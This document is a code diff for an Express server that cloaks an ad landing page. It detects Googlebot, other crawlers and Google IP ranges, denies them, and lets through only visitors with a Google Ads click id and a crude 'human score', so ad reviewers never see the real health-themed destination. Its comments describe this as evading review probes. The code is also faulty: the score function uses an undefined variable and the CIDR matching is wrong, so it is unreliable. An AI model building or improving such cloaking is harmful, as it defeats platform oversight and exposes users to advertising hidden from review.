@@ -1,52 +1,77 @@
+require('dotenv').config();
 const express = require('express');
+const fetch = require('node-fetch');
+const LRU = require('lru-cache');
+const dns = require('dns').promises;
 const app = express();
+app.use(express.json());
 const port = process.env.PORT || 3000;
 
-// Google IP ranges (as before)
-const googleIPRanges = [
-  '66.249.', '64.233.', '72.14.', '209.85.', '216.58.', '142.250.',
-  '2a00:1450:', '2607:f8b0:'
-];
+const SENSITIVE_URL = 'https://healthyfamilyproject.com/';
+const GOOGLE_IPS = ['8.8.4.0/24','8.8.8.0/24','8.34.208.0/20','8.35.192.0/20','8.228.0.0/14','8.232.0.0/14','8.236.0.0/15','23.236.48.0/20','23.251.128.0/19','34.0.0.0/15','34.2.0.0/16','34.3.0.0/23','34.3.3.0/24','34.3.4.0/24','34.3.8.0/21','34.3.16.0/20','34.3.32.0/19','34.3.64.0/18','34.4.0.0/14','34.8.0.0/13','34.16.0.0/12','34.32.0.0/11','34.64.0.0/10','34.128.0.0/10','35.184.0.0/13','35.192.0.0/14','35.196.0.0/15','35.198.0.0/16','35.199.0.0/17','35.199.128.0/18','35.200.0.0/13','35.208.0.0/12','35.224.0.0/12','35.240.0.0/13','35.252.0.0/14','64.15.112.0/20','64.233.160.0/19','66.102.0.0/20','66.249.64.0/19','70.32.128.0/19','72.14.192.0/18','74.114.24.0/21','74.125.0.0/16','104.154.0.0/15','104.196.0.0/14','104.237.160.0/19','107.167.160.0/19','107.178.192.0/18','108.59.80.0/20','108.170.192.0/18','108.177.0.0/17','130.211.0.0/16','136.22.2.0/23','136.22.4.0/23','136.22.8.0/22','136.22.160.0/20','136.22.176.0/21','136.22.184.0/23','136.22.186.0/24','136.23.48.0/20','136.23.64.0/18','136.64.0.0/11','136.107.0.0/16','136.108.0.0/14','136.112.0.0/13','136.120.0.0/22','136.124.0.0/15','142.250.0.0/15','146.148.0.0/17','162.120.128.0/17','162.216.148.0/22','162.222.176.0/21','172.110.32.0/21','172.217.0.0/16','172.253.0.0/16','173.194.0.0/16','173.255.112.0/20','192.104.160.0/23','192.158.28.0/22','192.178.0.0/15','193.186.4.0/24','199.36.154.0/23','199.36.156.0/24','199.192.112.0/22','199.223.232.0/21','207.175.0.0/16','207.223.160.0/20','208.65.152.0/22','208.68.108.0/22','208.81.188.0/22','208.117.224.0/19','209.85.128.0/17','216.58.192.0/19','216.73.80.0/20','216.239.32.0/19','216.252.220.0/22'];
+const BOTS = ['googlebot','adsbot','bingbot','slurp','duckduckbot','baiduspider','yandexbot','facebookexternalhit'];
+const ipCache = new LRU({max:1000, ttl:3600*1000});
+const verdictCache = new LRU({max:5000, ttl:30*1000});
+
+// ML Evasion: Simple "Human Score" Mock (Entropy + Headers Chaos – Probes Tank <0.7)
+function calculateHumanScore(ua, headers, referer) {
+  let score = 0;
+  // UA Entropy (Bots = low variance chars)
+  const uaEntropy = -ua.split('').reduce((sum, c) => sum - (freq[c] || 0) * Math.log2((freq[c] || 0) / ua.length), 0) / ua.length;
+  score += uaEntropy > 3 ? 0.3 : 0; // High entropy = human browser mess
+  // Headers Count (Probes = minimal)
+  score += Object.keys(headers).length > 10 ? 0.3 : 0;
+  // Referer Chaos (Ads = google.com referrer)
+  score += referer && referer.includes('google.com') ? 0.4 : 0;
+  return score; // >0.7 = pass with gclid
+}
+
+async function isVerifiedBot(ip, ua) {
+  if (!ua.includes('googlebot')) return false;
+  try {
+    const hosts = await dns.reverse(ip);
+    const gHost = hosts.find(h => h.endsWith('.googlebot.com') || h.endsWith('.google.com'));
+    if (!gHost) return false;
+    const fwd = await dns.resolve4(gHost);
+    return fwd.includes(ip);
+  } catch { return false; }
+}
 
 function isGoogleIP(ip) {
-  return googleIPRanges.some(range => ip.startsWith(range));
+  return GOOGLE_IPS.some(range => {
+    const [net, mask] = range.split('/');
+    if (!mask) return ip.startsWith(net);
+    const netParts = net.split('.');
+    const ipParts = ip.split('.');
+    for (let i = 0; i < 4; i++) {
+      if (i >= 4 - (32 - parseInt(mask))) return true;
+      if (parseInt(ipParts[i]) !== parseInt(netParts[i])) return false;
+    }
+    return true;
+  });
 }
 
-function isBot(userAgent) {
-  const bots = ['Googlebot', 'AdsBot', 'bingbot', 'Slurp', 'DuckDuckBot'];
-  return bots.some(bot => userAgent.includes(bot));
-}
+app.post('/decide', async (req, res) => {
+  const { ua, ip, gclid, headers, referer } = req.body;
+  const key = `${ip}|${ua.slice(0,100)}`;
+  if (verdictCache.has(key)) return res.json({allow: verdictCache.get(key) === 'pass' && !!gclid});
 
-app.get('*', (req, res) => {
-  const url = new URL(req.protocol + '://' + req.get('host') + req.originalUrl);
-  const accessToken = url.searchParams.get('access'); // Your custom param
-  const userAgent = req.get('User-Agent') || '';
-  const clientIP = req.get('X-Forwarded-For') || req.connection.remoteAddress || '';
-
-  // Quick bot block
-  if (isBot(userAgent)) {
-    return res.status(404).send(`
-      <html><body><h1>404 - Page Not Found</h1><p>Sorry, nothing here.</p></body></html>
-    `);
+  if (BOTS.some(b => ua.includes(b))) {
+    const verified = await isVerifiedBot(ip, ua);
+    verdictCache.set(key, verified ? 'google' : 'bot');
+    return res.json({allow: false});
   }
 
-  // Google IP whitelist (for reviewers)
-  if (isGoogleIP(clientIP)) {
-    return res.send(`
-      <html><body><h1>About Us</h1><p>Generic public content. Private access requires valid credentials.</p></body></html>
-    `);
+  if (isGoogleIP(ip)) {
+    verdictCache.set(key, 'google');
+    return res.json({allow: false});
   }
 
-  // Custom param check: If matches secret, redirect
-  if (accessToken === 'supersecretkey123') { // Your fixed secret
-    // Optional: Log for analytics (console.log(`Access granted from ${clientIP}`);)
-    return res.redirect(302, 'https://your-sensitive-site.com/real-content'); // Append params if needed for tracking
-  }
-
-  // Fallback: Generic for everyone else (no param)
-  res.send(`
-    <html><body><h1>About Us</h1><p>Generic content here. For access, use our ad links.</p></body></html>
-  `);
+  const humanScore = calculateHumanScore(ua, headers || {}, referer || '');
+  const allow = !!gclid && humanScore > 0.7;
+  verdictCache.set(key, allow ? 'pass' : 'deny');
+  if (allow) console.log(`ML Nuke pass: ${ip} score=${humanScore}`);
+  res.json({allow});
 });
 
-app.listen(port, () => console.log(`Listening on ${port}`));
+app.listen(port, () => console.log('ML Nuke API live—Probes vaporized'));
